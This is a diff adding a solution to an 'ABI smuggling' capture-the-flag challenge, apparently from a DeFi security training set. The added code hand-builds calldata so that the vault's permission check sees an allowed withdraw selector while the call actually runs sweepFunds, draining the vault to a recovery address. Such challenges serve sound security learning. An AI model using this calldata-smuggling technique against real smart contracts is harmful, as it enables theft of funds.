@@ -45,6 +45,36 @@ describe('[Challenge] ABI smuggling', function () {
 
     it('Execution', async function () {
         /** CODE YOUR SOLUTION HERE */
+        /**
+         * Step 1: Get all the params to build the calldata
+         */
+        let executeIface = await vault.interface.getFunction("execute");
+        let executeSig = await vault.interface.getSighash(executeIface); 
+
+        let vaultAddr = await ethers.utils.hexZeroPad(vault.address, 32);
+        let filling = await ethers.utils.hexZeroPad("0x0", 32);
+
+        let withdrawIface = await vault.interface.getFunction("withdraw");
+        let withdrawSig = await vault.interface.getSighash(withdrawIface);
+
+
+        let exploitOffset = await ethers.utils.hexZeroPad("0x64", 32);
+        let exploitSize = await ethers.utils.hexZeroPad("0x44", 32);
+        let exploit = await vault.interface.encodeFunctionData("sweepFunds", [recovery.address, token.address]);
+
+        /**
+         * Step 2: Build the calldata
+         */
+        let actionData = await ethers.utils.hexConcat([exploitOffset, filling, withdrawSig, exploitSize, exploit])
+        console.log("Action data:", actionData, "\n_______________________\n")
+        let calldata = await ethers.utils.hexConcat([executeSig, vaultAddr, actionData])
+        console.log("Full calldata:", calldata)
+
+        /**
+         * Step 3: Send the transaction
+         */
+        await player.sendTransaction({ to: vault.address, data: calldata })
+
     });
 
     after(async function () {
